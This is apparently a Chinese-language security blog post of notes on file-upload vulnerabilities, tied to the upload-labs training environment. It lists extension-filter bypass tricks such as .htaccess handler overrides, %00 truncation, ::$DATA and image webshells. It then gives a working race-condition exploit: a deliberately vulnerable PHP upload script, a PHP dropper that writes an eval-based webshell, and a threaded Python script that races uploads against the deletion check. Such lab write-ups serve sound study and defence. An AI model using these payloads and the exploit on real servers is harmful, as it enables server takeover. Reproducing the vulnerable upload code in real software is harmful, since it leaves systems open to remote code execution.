---
layout:     post
title:      上传漏洞
date:       2019-1-13
author:     Wh0ale
header-img: img/1.jpg
---

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2xp9fu8cj20fe0e6qdy.jpg)

上传姿势：

1.前端绕过

2.content-type: image/hif

3.黑名单绕过   1.phtml

4..htaccess       所有文件都会解析为php，然后再上传图片马，就可以解析：

SetHandler application/x-httpd-php

5.大小写绕过

6.可在后缀名中加空绕过

7.没有对后缀名进行去”.”处理

8.没有对后缀名进行去”::$DATA”处理

9.info.php. . （点+空格+点），经过处理后，文件名变成info.php.，

10.后缀名替换为空，于是可以利用双写绕过

11.$img_path直接拼接，因此可以利用%00截断绕过

12.在二进制中进行修改，因为post不会像get对%00进行自动解码

13.图片马

14.修改文件头



**竞争上传**

演示代码：

```php
<?php
$allowtype = array("gif","png","jpg");
$size = 10000000;
$path = "./";

$filename = $_FILES['file']['name'];

if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
        die("error:can not move");
    }
}else{
    die("error:not an upload file！");
}
$newfile = $path.$filename;
echo "file upload success.file path is: ".$newfile."\n<br />";

if($_FILES['file']['error']>0){
    unlink($newfile);
    die("Upload file error: ");
}
$ext = array_pop(explode(".",$_FILES['file']['name']));
if(!in_array($ext,$allowtype)){
    unlink($newfile);
    die("error:upload the file type is not allowed，delete the file！");
}
?>
```



首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：

copy.php

```php
<?php fputs(fopen("./info.php", "w"), '<?php @eval($_POST["drops"]) ?>'); ?>
```

当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：

```php
import os
import requests
import threading

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.url = "http://127.0.0.1:8080/upload/shell0.php"
        self.uploadUrl = "http://127.0.0.1:8080/upload/copy.php"

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print("[*]create file info.php success")
            os._exit(0)

    def _upload(self):
        print("upload file.....")
        file = {"file":open("shell0.php","r")}
        requests.post(self.uploadUrl, files=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()
            for i in range(10):
                self._upload()
                self._get()

if __name__ == "__main__":
    threads = 20

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()
```

经过几次尝试后成功成功写入shell



reference：

[Upload-lab 先知](https://xz.aliyun.com/t/2435)

<https://github.com/c0ny1/upload-labs>